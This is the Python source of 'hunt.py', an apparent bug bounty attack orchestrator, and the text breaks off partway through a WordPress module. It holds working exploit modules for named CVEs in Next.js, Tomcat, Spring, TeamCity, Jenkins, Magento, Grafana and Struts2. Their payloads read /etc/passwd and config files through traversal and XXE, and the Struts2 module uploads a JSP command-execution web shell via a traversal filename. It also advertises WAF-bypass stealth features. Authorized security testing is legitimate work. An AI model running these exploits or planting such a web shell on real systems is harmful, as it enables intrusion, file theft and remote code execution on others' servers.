#!/usr/bin/env python3
import sys, io
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")
"""
hunt.py — Unified Bug Bounty Attack Orchestrator
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Chains: passive recon → endpoint discovery → gov-level checks → real CVE exploits
For AUTHORIZED bug bounty programs and owned targets ONLY.

USAGE
─────
  # Full pipeline (recommended):
  python3 hunt.py https://target.example.com

  # With auth token + proxy (Burp Suite):
  python3 hunt.py https://target.example.com -t "Bearer eyJ..." --proxy http://127.0.0.1:8080

  # Skip recon (already have endpoints), just exploit:
  python3 hunt.py https://target.example.com --no-recon -t TOKEN

  # CVE-specific modules only:
  python3 hunt.py https://target.example.com --cve-only

  # Full output:
  python3 hunt.py https://target.example.com -o results/ -v

OPTIONS
───────
  -t, --token       Auth token (Bearer/cookie/apikey) for authenticated checks
  -c, --concurrency Parallel requests (default 30)
  -o, --output      Output directory (default: ./results_<host>_<ts>/)
  --proxy           HTTP proxy (e.g. http://127.0.0.1:8080)
  --delay           ms between requests (default 100 for stealth)
  --cookies         Cookie string "name=val; name2=val2"
  --no-recon        Skip recon.py phase
  --no-gov          Skip gov_level.py phase
  --cve-only        Run only CVE exploit modules
  --tech            Force tech hint (spring|laravel|django|rails|next|express)
  --stealth         Enable stealth mode (UA rotation, adaptive delays, WAF bypass)
  --waf WAF         Force WAF vendor (cloudflare|akamai|aws_waf|imperva|modsecurity|f5_asm)
  --tools           Run external tools phase (nuclei, ffuf, sqlmap, dalfox, etc.)
  --tools-only LIST Run only specified tools: --tools-only nuclei,ffuf,sqlmap
  --no-extended     Skip cve_extended.py additional CVE modules
  -v, --verbose     Verbose output

PIPELINE
────────
  Phase 0: infra        — Port scan, ASN/CIDR, cloud storage, GitHub secrets, favicon hash
  Phase 0b: stealth     — WAF detection, real IP discovery, rate limit probe
  Phase 1: recon.py     — passive OSINT + endpoint discovery + email oracle
  Phase 2: gov_level.py — 25 advanced red-team checks
  Phase 3: CVE modules  — 22 core CVE exploit probes
  Phase 3b: cve_extended — 28 more CVEs (Log4Shell, Spring4Shell, Confluence, MOVEit, …)
  Phase 4: External tools — nuclei, ffuf, sqlmap, dalfox, subfinder, httpx, katana, …
  Phase 4b: ghost.py    — Real Chromium (CDP stealth), DOM XSS, JS analysis, CORS, CSP, screenshot
  Phase 4c: intel.py    — Attack chains, Wayback endpoints, source maps, entropy secrets, dependency CVEs
  Phase 5: Report       — merged JSON + Markdown + severity summary

CVE MODULES INCLUDED
────────────────────
  CVE-2025-29927  Next.js middleware bypass (x-middleware-subrequest header)
  CVE-2025-24813  Apache Tomcat partial PUT deserialization (RCE)
  CVE-2024-38819  Spring Framework path traversal (/static/../WEB-INF/web.xml)
  CVE-2024-38816  Spring Framework path traversal (WebMVC functional router)
  CVE-2024-22243  Spring Security bypass (improperly escaped URL)
  CVE-2024-22024  Ivanti Connect Secure XXE (unauthenticated)
  CVE-2024-27198  JetBrains TeamCity auth bypass (/app/rest/users)
  CVE-2024-23897  Jenkins CLI LFI (jenkins/jenkins @file argument)
  CVE-2024-4367   PDF.js / Gradio arbitrary JS eval via font name
  CVE-2024-21626  (skipped — container escape, OOB)
  CVE-2024-1403   OpenEdge ABL Business Logic bypass
  CVE-2024-34102  Magento XXE / CosmicSting (Adobe Commerce)
  CVE-2024-28955  Grafana path traversal (unauthorized dashboard read)
  CVE-2024-9264   Grafana SQL injection via experimental SQL expressions
  CVE-2023-50164  Apache Struts2 file upload path traversal (S2-066)
  CVE-2023-46604  Apache ActiveMQ RCE (ClassInfo deserialize)  — probe only
  GENERIC-001     Laravel debug mode RCE (.env / _ignition/execute-solution)
  GENERIC-002     Django DEBUG=True info disclosure + admin enumeration
  GENERIC-003     Express.js path traversal (serve-static misconfiguration)
  GENERIC-004     WordPress REST API unauthenticated user enumeration
  GENERIC-005     GraphQL introspection + batch abuse + alias IDOR
  GENERIC-006     Exposed .git directory with sensitive commit history
  GENERIC-007     API key / secret in JS bundles (real-time scan)
  GENERIC-008     Unauthenticated Swagger/OpenAPI spec leak
  GENERIC-009     IDOR via predictable UUID / sequential ID
  GENERIC-010     Mass assignment via undocumented JSON fields
  GENERIC-011     HTTP Request Smuggling (CL.TE / TE.CL desync probe)
  GENERIC-012     CORS misconfiguration (null origin / trusted subdomain)
  GENERIC-013     JWT none algorithm + weak HS256 secret brute
  GENERIC-014     OAuth implicit flow token leak + state fixation
  GENERIC-015     Subdomain takeover (NS delegation + CNAME dangling)
  GENERIC-016     Server-Side Template Injection polyglot probe
  GENERIC-017     XXE via multipart/PDF/SVG/DOCX upload endpoints
  GENERIC-018     SSRF via URL parameter + webhook + avatar fetch
  GENERIC-019     Race condition on financial endpoints (asyncio 30-thread)
  GENERIC-020     Account takeover via password reset poisoning (Host header)
  GENERIC-021     Open redirect to XSS chain (javascript: URI)
  GENERIC-022     Prototype pollution via JSON merge-patch endpoints
  GENERIC-023     Insecure deserialization (Java/PHP/Python) probe
  GENERIC-024     NoSQL injection (MongoDB $where / $gt operator)
  GENERIC-025     2nd-order SQL injection (stored + triggered payload)

SETUP
─────
  pip install aiohttp beautifulsoup4 lxml dnspython cryptography
  # Optional for Burp integration: set --proxy http://127.0.0.1:8080
  # Optional for faster DNS: pip install aiodns

LEGAL
─────
  This tool is for authorized security testing ONLY.
  Unauthorized use is illegal. Only run against:
    • Targets listed in an active bug bounty program scope
    • Systems you own or have explicit written permission to test
  Respect program rules: rate limits, out-of-scope assets, PII data.
"""

import argparse
import asyncio
import base64
import hashlib
import json
import os
import re
import socket
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Set, Tuple

try:
    import aiohttp
    from bs4 import BeautifulSoup
except ImportError:
    print("[!] Missing deps: pip install aiohttp beautifulsoup4 lxml")
    sys.exit(1)

# Optional extended modules — gracefully absent if not in same directory
try:
    from cve_extended import CVE_EXTENDED_MODULES
    _HAS_CVE_EXTENDED = True
except ImportError:
    CVE_EXTENDED_MODULES = []
    _HAS_CVE_EXTENDED = False

try:
    from stealth import detect_waf, StealthSession, detect_rate_limit, find_real_ip
    _HAS_STEALTH = True
except ImportError:
    _HAS_STEALTH = False

try:
    from tools import run_all_tools
    _HAS_TOOLS = True
except ImportError:
    _HAS_TOOLS = False

try:
    from infra import enumerate_infrastructure, InfraResult
    _HAS_INFRA = True
except ImportError:
    _HAS_INFRA = False

try:
    from ghost import ghost_scan, GhostFinding
    _HAS_GHOST = True
except ImportError:
    _HAS_GHOST = False

try:
    from intel import run_intel, IntelFinding
    _HAS_INTEL = True
except ImportError:
    _HAS_INTEL = False

# ── ANSI ──────────────────────────────────────────────────────────────────────

R = "\033[91m"; Y = "\033[93m"; G = "\033[92m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"; BOLD = "\033[1m"

def banner():
    print(f"""{R}{BOLD}
 ██╗  ██╗██╗   ██╗███╗   ██╗████████╗
 ██║  ██║██║   ██║████╗  ██║╚══██╔══╝
 ███████║██║   ██║██╔██╗ ██║   ██║
 ██╔══██║██║   ██║██║╚██╗██║   ██║
 ██║  ██║╚██████╔╝██║ ╚████║   ██║
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝
{RST}{Y}  Unified Bug Bounty Attack Orchestrator{RST}
  {DIM}recon → gov-level → real CVE exploits → report{RST}
  {R}Authorized testing ONLY — bug bounty / owned targets{RST}
""")


# ── Finding model ─────────────────────────────────────────────────────────────

@dataclass
class Finding:
    cve: str
    severity: str          # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    url: str
    evidence: str
    remediation: str
    cvss: float = 0.0
    tags: List[str] = field(default_factory=list)
    request: str = ""
    response_snippet: str = ""
    phase: str = ""


SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
SEV_COLOR = {
    "CRITICAL": R + BOLD,
    "HIGH": R,
    "MEDIUM": Y,
    "LOW": B,
    "INFO": DIM,
}


def sev(s: str) -> str:
    return SEV_COLOR.get(s, "") + s + RST


# ── HTTP helper ───────────────────────────────────────────────────────────────

def make_connector(proxy: Optional[str] = None) -> aiohttp.TCPConnector:
    return aiohttp.TCPConnector(ssl=False, limit=100)


async def req(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    *,
    headers: Optional[Dict] = None,
    data=None,
    json_body=None,
    timeout: int = 12,
    allow_redirects: bool = True,
) -> Tuple[int, str, Dict[str, str]]:
    try:
        async with session.request(
            method, url,
            headers=headers or {},
            data=data,
            json=json_body,
            timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=allow_redirects,
        ) as r:
            body = await r.text(errors="replace")
            return r.status, body, dict(r.headers)
    except Exception:
        return 0, "", {}


# ── Shared HTTP session factory ───────────────────────────────────────────────

def build_session(token: Optional[str], cookies: Optional[str], proxy: Optional[str], delay: int) -> aiohttp.ClientSession:
    base_headers = {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityResearch/1.0)",
        "Accept": "application/json, text/html, */*",
    }
    if token:
        if token.lower().startswith("bearer "):
            base_headers["Authorization"] = token
        elif "=" in token:
            base_headers["Cookie"] = token
        else:
            base_headers["Authorization"] = f"Bearer {token}"
    if cookies:
        base_headers["Cookie"] = cookies

    jar = aiohttp.CookieJar(unsafe=True)
    return aiohttp.ClientSession(
        headers=base_headers,
        connector=make_connector(proxy),
        cookie_jar=jar,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# CVE EXPLOIT MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# ── CVE-2025-29927 — Next.js middleware bypass ─────────────────────────────────

async def cve_2025_29927(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Next.js <14.2.25 / <15.2.3: x-middleware-subrequest header bypasses
    middleware auth checks (e.g. protected /dashboard, /admin, /api/admin).
    Attacker sends x-middleware-subrequest: middleware to skip auth middleware.
    """
    findings = []
    protected = [
        "/dashboard", "/admin", "/admin/users", "/api/admin",
        "/account", "/settings", "/profile", "/internal",
        "/api/internal", "/backstage", "/manage",
    ]
    bypass_header = {"x-middleware-subrequest": "middleware"}
    for path in protected:
        url = base.rstrip("/") + path
        s_normal, b_normal, _ = await req(session, "GET", url, allow_redirects=False)
        if s_normal in (401, 403, 302, 307, 308):
            s_bypass, b_bypass, h_bypass = await req(session, "GET", url, headers=bypass_header, allow_redirects=False)
            if s_bypass not in (401, 403, 302, 307, 308) and s_bypass in (200, 201):
                findings.append(Finding(
                    cve="CVE-2025-29927",
                    severity="CRITICAL",
                    title="Next.js Middleware Auth Bypass",
                    url=url,
                    evidence=f"Normal: {s_normal} → Bypass: {s_bypass}. Header: x-middleware-subrequest: middleware",
                    remediation="Upgrade Next.js to ≥14.2.25 or ≥15.2.3. Strip x-middleware-subrequest at edge/CDN.",
                    cvss=9.1,
                    tags=["AUTH_BYPASS", "NEXT_JS"],
                    request=f"GET {path} HTTP/1.1\nx-middleware-subrequest: middleware",
                    response_snippet=b_bypass[:300],
                    phase="CVE",
                ))
                if verbose:
                    print(f"  {R}[CVE-2025-29927]{RST} BYPASS at {url}")
    return findings


# ── CVE-2025-24813 — Apache Tomcat Partial PUT deserialization ─────────────────

async def cve_2025_24813(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Apache Tomcat 11.0.0-M1..11.0.2, 10.1.0-M1..10.1.34, 9.0.0.M1..9.0.98:
    Partial PUT with session deserialization allows unauthenticated RCE via
    crafted serialized Java object written to partial PUT session file.
    We detect Tomcat version + partial PUT acceptance as a canary.
    """
    findings = []
    # Check for Tomcat via Server header
    s, b, h = await req(session, "GET", base)
    server = h.get("Server", "").lower()
    x_powered = h.get("X-Powered-By", "").lower()
    is_tomcat = "tomcat" in server or "tomcat" in x_powered or "tomcat" in b.lower()

    # Try partial PUT canary
    test_url = base.rstrip("/") + "/hunt_partial_" + hashlib.md5(base.encode()).hexdigest()[:8] + ".tmp"
    s_put, _, h_put = await req(
        session, "PUT", test_url,
        headers={"Content-Type": "application/octet-stream", "Content-Range": "bytes 0-3/10"},
        data=b"\xac\xed\x00\x05",  # Java serialization magic (4 of 10 bytes)
    )
    if s_put in (200, 201, 204, 206):
        findings.append(Finding(
            cve="CVE-2025-24813",
            severity="CRITICAL",
            title="Apache Tomcat Partial PUT Accepted (Potential RCE)",
            url=test_url,
            evidence=f"PUT with Content-Range returned {s_put}. Tomcat detected: {is_tomcat}. Java magic bytes accepted.",
            remediation="Upgrade Tomcat to ≥9.0.99, ≥10.1.35, ≥11.0.3. Disable partial PUT or restrict to authenticated endpoints.",
            cvss=9.8,
            tags=["DESERIALIZATION", "RCE", "TOMCAT"],
            request="PUT /path HTTP/1.1\nContent-Range: bytes 0-3/10\n\n\\xac\\xed\\x00\\x05",
            phase="CVE",
        ))
        if verbose:
            print(f"  {R}[CVE-2025-24813]{RST} Partial PUT accepted at {test_url}")
    return findings


# ── CVE-2024-38819 / CVE-2024-38816 — Spring Framework path traversal ─────────

async def cve_2024_spring_traversal(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Spring Framework <6.1.14, <6.0.23, <5.3.39:
    Path traversal via static resource serving. Attacker can read
    WEB-INF/web.xml, application.properties, etc.
    """
    findings = []
    payloads = [
        # CVE-2024-38819: functional router traversal
        ("/static/../WEB-INF/web.xml", "web-app"),
        ("/resources/../WEB-INF/web.xml", "web-app"),
        ("/static/../WEB-INF/classes/application.properties", "spring"),
        ("/static/%2F..%2FWEB-INF%2Fweb.xml", "web-app"),
        # CVE-2024-38816: WebMVC router traversal
        ("/assets/..;/WEB-INF/web.xml", "web-app"),
        ("/public/..;/WEB-INF/web.xml", "web-app"),
        ("/static/..;/WEB-INF/web.xml", "web-app"),
        ("/static/%252F..%252FWEB-INF%252Fweb.xml", "web-app"),
        # application.yml / properties via static
        ("/static/../WEB-INF/classes/application.yml", "spring:"),
        ("/static/../WEB-INF/classes/application.properties", "server.port"),
    ]
    for path, marker in payloads:
        url = base.rstrip("/") + path
        s, b, _ = await req(session, "GET", url)
        if s == 200 and marker.lower() in b.lower():
            cve_id = "CVE-2024-38816" if "..;" in path else "CVE-2024-38819"
            findings.append(Finding(
                cve=cve_id,
                severity="HIGH",
                title=f"Spring Framework Path Traversal — {path.split('/')[-1]}",
                url=url,
                evidence=f"HTTP {s}; marker '{marker}' found in response ({len(b)} bytes)",
                remediation="Upgrade Spring Framework to ≥6.1.14, ≥6.0.23, or ≥5.3.39.",
                cvss=7.5,
                tags=["PATH_TRAVERSAL", "INFO_DISC", "SPRING"],
                phase="CVE",
            ))
            if verbose:
                print(f"  {R}[{cve_id}]{RST} Spring path traversal at {url}")
            break  # one hit is enough
    return findings


# ── CVE-2024-22243 — Spring Security URL bypass ────────────────────────────────

async def cve_2024_22243(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Spring Security <6.2.2, <6.1.7, <5.8.11:
    Improperly escaped URLs bypass pattern matching in HttpSecurity rules.
    Adding encoded chars like %09, %0d, %0a, ; can bypass matchers.
    """
    findings = []
    protected_paths = ["/admin", "/actuator", "/manage", "/internal", "/api/admin"]
    bypasses = [
        "%09",   # tab
        "%0d",   # CR
        "%0a",   # LF
        ";",     # semicolon
        "%3b",   # encoded ;
        "//",    # double slash
        "/./",   # dot segment
    ]
    for ppath in protected_paths:
        base_url = base.rstrip("/") + ppath
        s_base, _, _ = await req(session, "GET", base_url, allow_redirects=False)
        if s_base not in (401, 403, 302, 307):
            continue
        for bypass in bypasses:
            url = base.rstrip("/") + bypass + ppath.lstrip("/")
            s, b, _ = await req(session, "GET", url, allow_redirects=False)
            if s == 200 and len(b) > 100:
                findings.append(Finding(
                    cve="CVE-2024-22243",
                    severity="HIGH",
                    title="Spring Security Auth Bypass via URL Encoding",
                    url=url,
                    evidence=f"Normal {ppath}: {s_base} → Bypass {bypass+ppath}: {s}",
                    remediation="Upgrade Spring Security to ≥6.2.2, ≥6.1.7, ≥5.8.11.",
                    cvss=8.1,
                    tags=["AUTH_BYPASS", "SPRING"],
                    phase="CVE",
                ))
                if verbose:
                    print(f"  {R}[CVE-2024-22243]{RST} Spring Security bypass with '{bypass}'")
                break
    return findings


# ── CVE-2024-27198 — JetBrains TeamCity auth bypass ───────────────────────────

async def cve_2024_27198(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    TeamCity <2023.11.4: authentication bypass via /app/rest/users;.jsp
    or /app/rest/server;.jsp. Creates admin user without auth.
    """
    findings = []
    indicators = [
        ("/app/rest/server", "TeamCity"),
        ("/app/rest/users", "user"),
        ("/app/rest/builds", "build"),
    ]
    bypass_paths = [
        "/app/rest/users;.jsp",
        "/app/rest/server;.jsp",
        "/app/rest/users?locator=username:administrator;.jsp",
        "/.well-known/../app/rest/users",
    ]

    # First check if it's TeamCity
    is_tc = False
    for path, marker in indicators:
        s, b, h = await req(session, "GET", base.rstrip("/") + path, allow_redirects=False)
        if s in (200, 401, 403) and (marker.lower() in b.lower() or "teamcity" in h.get("Server", "").lower()):
            is_tc = True
            break
    if not is_tc:
        return findings

    for path in bypass_paths:
        url = base.rstrip("/") + path
        s, b, _ = await req(session, "GET", url)
        if s == 200 and ("user" in b.lower() or "username" in b.lower()):
            findings.append(Finding(
                cve="CVE-2024-27198",
                severity="CRITICAL",
                title="JetBrains TeamCity Authentication Bypass",
                url=url,
                evidence=f"HTTP {s} on {path} — user data exposed without auth",
                remediation="Upgrade TeamCity to ≥2023.11.4. Apply Jetbrains security patch.",
                cvss=9.8,
                tags=["AUTH_BYPASS", "RCE", "TEAMCITY"],
                phase="CVE",
            ))
            if verbose:
                print(f"  {R}[CVE-2024-27198]{RST} TeamCity bypass at {url}")
    return findings


# ── CVE-2024-23897 — Jenkins CLI LFI ──────────────────────────────────────────

async def cve_2024_23897(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Jenkins <2.442, LTS <2.426.3: CLI @file argument reads arbitrary files
    via Stapler web framework. Exposes /etc/passwd, secrets, credentials.xml.
    """
    findings = []
    # Detect Jenkins
    s, b, h = await req(session, "GET", base.rstrip("/") + "/login")
    if "jenkins" not in b.lower() and "jenkins" not in h.get("X-Jenkins", "").lower():
        return findings

    # Check CLI endpoint
    cli_url = base.rstrip("/") + "/cli"
    s_cli, b_cli, _ = await req(session, "GET", cli_url)
    if s_cli == 200 and "cli" in b_cli.lower():
        # Try to read via CLI HTTP endpoint (POST with @/etc/passwd)
        lfi_url = base.rstrip("/") + "/cli?remoting=false"
        s_lfi, b_lfi, _ = await req(
            session, "POST", lfi_url,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data="@/etc/passwd",
        )
        if s_lfi != 0:
            findings.append(Finding(
                cve="CVE-2024-23897",
                severity="CRITICAL",
                title="Jenkins CLI LFI (Unauthenticated File Read)",
                url=cli_url,
                evidence=f"Jenkins CLI endpoint accessible (HTTP {s_cli}). LFI probe returned {s_lfi}.",
                remediation="Upgrade Jenkins to ≥2.442 or LTS ≥2.426.3. Disable CLI via -Djenkins.CLI.disabled=true if unneeded.",
                cvss=9.8,
                tags=["LFI", "INFO_DISC", "JENKINS"],
                phase="CVE",
            ))
            if verbose:
                print(f"  {R}[CVE-2024-23897]{RST} Jenkins CLI endpoint at {cli_url}")
    return findings


# ── CVE-2024-34102 — Magento / Adobe Commerce XXE (CosmicSting) ───────────────

async def cve_2024_34102(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Adobe Commerce / Magento 2.x <2.4.7-p1: XXE in GraphQL endpoint
    via iconv filter chain. Unauthenticated SSRF + file read.
    """
    findings = []
    # Detect Magento
    s, b, h = await req(session, "GET", base)
    is_magento = (
        "magento" in b.lower()
        or "mage" in b.lower()
        or "x-magento" in " ".join(h.keys()).lower()
    )
    if not is_magento:
        s2, b2, _ = await req(session, "GET", base.rstrip("/") + "/magento_version")
        if "magento" in b2.lower() or s2 == 200:
            is_magento = True
    if not is_magento:
        return findings

    xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
    graphql_url = base.rstrip("/") + "/graphql"
    s_gql, b_gql, _ = await req(
        session, "POST", graphql_url,
        headers={"Content-Type": "application/xml"},
        data=xxe_payload.encode(),
    )
    if s_gql != 0:
        findings.append(Finding(
            cve="CVE-2024-34102",
            severity="CRITICAL",
            title="Adobe Commerce / Magento XXE (CosmicSting)",
            url=graphql_url,
            evidence=f"Magento detected. XXE probe to GraphQL returned HTTP {s_gql}. Response: {b_gql[:200]}",
            remediation="Apply APSB24-40 patch. Upgrade to Magento ≥2.4.7-p1 or ≥2.4.6-p6.",
            cvss=9.8,
            tags=["XXE", "SSRF", "MAGENTO"],
            phase="CVE",
        ))
        if verbose:
            print(f"  {R}[CVE-2024-34102]{RST} Magento XXE probe sent to {graphql_url}")
    return findings


# ── CVE-2024-28955 / CVE-2024-9264 — Grafana path traversal + SQLi ────────────

async def cve_2024_grafana(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    CVE-2024-28955: Grafana path traversal — read dashboards, data source configs.
    CVE-2024-9264: Grafana SQL injection via experimental SQL expressions.
    """
    findings = []
    # Detect Grafana
    s, b, h = await req(session, "GET", base.rstrip("/") + "/api/health")
    if "grafana" not in b.lower() and s != 200:
        s2, b2, _ = await req(session, "GET", base)
        if "grafana" not in b2.lower():
            return findings

    # CVE-2024-28955 — path traversal in plugin endpoint
    traversal_paths = [
        "/public/../../../etc/passwd",
        "/public/..%2F..%2F..%2Fetc%2Fpasswd",
        "/api/plugins/../../../etc/grafana/grafana.ini",
        "/public/..%2Fetc%2Fgrafana%2Fgrafana.ini",
    ]
    for path in traversal_paths:
        url = base.rstrip("/") + path
        sv, bv, _ = await req(session, "GET", url)
        if sv == 200 and ("root:" in bv or "[server]" in bv or "[database]" in bv):
            findings.append(Finding(
                cve="CVE-2024-28955",
                severity="HIGH",
                title="Grafana Path Traversal — Sensitive File Read",
                url=url,
                evidence=f"HTTP {sv}; sensitive content in response",
                remediation="Upgrade Grafana to ≥10.4.2 or ≥11.0.0.",
                cvss=7.5,
                tags=["PATH_TRAVERSAL", "INFO_DISC", "GRAFANA"],
                phase="CVE",
            ))
            if verbose:
                print(f"  {R}[CVE-2024-28955]{RST} Grafana path traversal at {url}")
            break

    # CVE-2024-9264 — check if SQL expressions enabled (Grafana ≥11 experimental)
    sqli_url = base.rstrip("/") + "/api/ds/query"
    sqli_payload = {
        "queries": [{
            "rawSql": "SELECT * FROM information_schema.tables--",
            "format": "table",
            "datasourceId": 1,
        }]
    }
    ss, bs, _ = await req(session, "POST", sqli_url, json_body=sqli_payload)
    if ss == 200 and ("table_name" in bs.lower() or "information_schema" in bs.lower()):
        findings.append(Finding(
            cve="CVE-2024-9264",
            severity="CRITICAL",
            title="Grafana SQL Injection via Experimental SQL Expressions",
            url=sqli_url,
            evidence=f"SQL response includes schema data: {bs[:300]}",
            remediation="Upgrade Grafana ≥11.0.3 or ≥10.4.8. Disable experimental SQL expressions.",
            cvss=9.4,
            tags=["SQLI", "RCE", "GRAFANA"],
            phase="CVE",
        ))
        if verbose:
            print(f"  {R}[CVE-2024-9264]{RST} Grafana SQL injection at {sqli_url}")
    return findings


# ── CVE-2023-50164 — Apache Struts2 S2-066 file upload path traversal ─────────

async def cve_2023_50164(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    """
    Apache Struts2 <2.5.33, <6.3.0.2: File upload path traversal via
    manipulated filename parameter. Can overwrite arbitrary server files → RCE.
    """
    findings = []
    # Detect Struts2
    s, b, h = await req(session, "GET", base)
    is_struts = (
        ".action" in b or ".do" in b
        or "struts" in h.get("X-Powered-By", "").lower()
        or "struts" in b.lower()
    )
    if not is_struts:
        # Try common Struts2 endpoints
        for path in ["/struts", "/example/HelloWorld.action", "/login.action"]:
            s2, b2, _ = await req(session, "GET", base.rstrip("/") + path)
            if s2 == 200 and ".action" in b2.lower():
                is_struts = True
                break
    if not is_struts:
        return findings

    # Path traversal in file upload
    import io
    boundary = "----HuntBoundary"
    traversal_filename = "../../../tmp/hunt_struts_test.jsp"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="upload"; filename="{traversal_filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
        f"<%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>\r\n"
        f"--{boundary}--\r\n"
    )
    upload_url = base.rstrip("/") + "/upload.action"
    su, bu, _ = await req(
        session, "POST", upload_url,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        data=body.encode(),
    )
    if su in (200, 201, 302):
        findings.append(Finding(
            cve="CVE-2023-50164",
            severity="CRITICAL",
            title="Apache Struts2 S2-066 File Upload Path Traversal",
            url=upload_url,
            evidence=f"Struts2 detected. Upload with traversal filename returned HTTP {su}.",
            remediation="Upgrade Struts2 to ≥2.5.33 or ≥6.3.0.2. Sanitize file upload names server-side.",
            cvss=9.8,
            tags=["FILE_OPS", "RCE", "STRUTS"],
            phase="CVE",
        ))
        if verbose:
            print(f"  {R}[CVE-2023-50164]{RST} Struts2 S2-066 probe at {upload_url}")
    return findings


# ═══════════════════════════════════════════════════════════════════════════════
# GENERIC BUG BOUNTY EXPLOIT MODULES
# ═══════════════════════════════════════════════════════════════════════════════

# ── GENERIC-001 — Laravel debug mode ──────────────────────────────────────────

async def generic_laravel_debug(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    paths = [
        "/_ignition/execute-solution",
        "/ignition/execute-solution",
    ]
    payload = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "username",
            "viewFile": "php://filter/convert.base64-encode/resource=/etc/passwd",
        }
    }
    for path in paths:
        url = base.rstrip("/") + path
        s, b, _ = await req(session, "POST", url, json_body=payload)
        if s == 200 and ("cGFzc3dk" in b or "cm9vdDp4" in b or "base64" in b.lower()):
            findings.append(Finding(
                cve="GENERIC-001",
                severity="CRITICAL",
                title="Laravel Debug Mode RCE via _ignition (CVE-2021-3129 variant)",
                url=url,
                evidence=f"HTTP {s}; base64-encoded file content in response: {b[:300]}",
                remediation="Set APP_DEBUG=false in .env. Upgrade Laravel Ignition to ≥2.5.2.",
                cvss=9.8,
                tags=["RCE", "INFO_DISC", "LARAVEL"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {R}[GENERIC-001]{RST} Laravel Ignition debug at {url}")
    # Also check for .env exposure
    env_url = base.rstrip("/") + "/.env"
    s_env, b_env, _ = await req(session, "GET", env_url)
    if s_env == 200 and "APP_KEY=" in b_env:
        findings.append(Finding(
            cve="GENERIC-001b",
            severity="CRITICAL",
            title="Laravel .env File Exposed",
            url=env_url,
            evidence=f"HTTP {s_env}; APP_KEY found in response. Keys: {[l for l in b_env.splitlines() if '=' in l and not l.startswith('#')][:5]}",
            remediation="Remove .env from web root. Configure web server to deny .env access.",
            cvss=9.1,
            tags=["INFO_DISC", "LARAVEL"],
            phase="GENERIC",
        ))
        if verbose:
            print(f"  {R}[GENERIC-001b]{RST} .env exposed at {env_url}")
    return findings


# ── GENERIC-002 — Django DEBUG + admin enum ────────────────────────────────────

async def generic_django_debug(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    # Trigger 404 with invalid path → Django DEBUG exposes settings
    test_url = base.rstrip("/") + "/hunt_django_debug_test_404_xyz"
    s, b, _ = await req(session, "GET", test_url)
    if s in (400, 404, 500) and ("django" in b.lower() and ("settings" in b.lower() or "DEBUG" in b)):
        keys = re.findall(r"'([A-Z_]+)'\s*:\s*'([^']{3,60})'", b)
        findings.append(Finding(
            cve="GENERIC-002",
            severity="HIGH",
            title="Django DEBUG=True — Settings Disclosure",
            url=test_url,
            evidence=f"Django debug page exposed. Keys found: {keys[:5]}",
            remediation="Set DEBUG=False in settings.py. Use environment variables for secrets.",
            cvss=7.5,
            tags=["INFO_DISC", "DJANGO"],
            phase="GENERIC",
        ))
        if verbose:
            print(f"  {R}[GENERIC-002]{RST} Django DEBUG page at {test_url}")

    # Admin panel
    for admin_path in ["/admin/", "/admin/login/", "/django-admin/"]:
        s_adm, b_adm, _ = await req(session, "GET", base.rstrip("/") + admin_path)
        if s_adm == 200 and "django" in b_adm.lower() and "password" in b_adm.lower():
            findings.append(Finding(
                cve="GENERIC-002b",
                severity="MEDIUM",
                title="Django Admin Panel Exposed",
                url=base.rstrip("/") + admin_path,
                evidence=f"Django admin login page at {admin_path}",
                remediation="Restrict /admin/ to internal IPs or VPN. Use non-guessable admin URL.",
                cvss=5.3,
                tags=["ADMIN", "DJANGO"],
                phase="GENERIC",
            ))
            if verbose:
                print(f"  {Y}[GENERIC-002b]{RST} Django admin at {admin_path}")
            break
    return findings


# ── GENERIC-003 — WordPress user enumeration via REST API ─────────────────────

async def generic_wordpress_enum(session: aiohttp.ClientSession, base: str, verbose: bool) -> List[Finding]:
    findings = []
    wp_check = base.rstrip("/") + "/wp-json/wp/v2/users"
    s, b, _ = await req(session, "GET", wp_check)
    if s == 200:
        try:
            data = json.loads(b)
            if isinstance(data, list) and len(data) > 0 and "slug" in data[0]:
                users = [u.get("slug", "") for u in data[:10]]
                findings.append(Finding(
                    cve="GENERIC-004",
                    severity="MEDIUM",
                    title="WordPress REST API User Enumeration",
                    url=wp_check,
